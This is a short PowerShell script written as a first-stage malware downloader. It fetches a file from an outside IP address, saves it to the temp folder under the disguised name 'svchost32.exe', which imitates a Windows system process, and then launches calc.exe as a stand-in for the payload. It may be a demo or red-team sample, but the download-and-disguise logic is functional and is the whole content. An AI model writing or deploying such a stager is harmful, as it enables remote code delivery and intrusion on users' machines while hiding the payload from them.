
[CmdletBinding()]
param(
    [string]$FetchUrl = "https://198.51.100.166:443/stage1.ps1",
    [string]$OutputPath = "$env:TEMP\svchost32.exe",
    [int]$StageTimeout = 103
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$OperationResult = Get-Stage1Payload -SourceUrl $FetchUrl -DestinationPath $OutputPath -TimeoutSec $StageTimeout
if ($OperationResult) {
    Start-Process -FilePath "calc.exe"
}
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
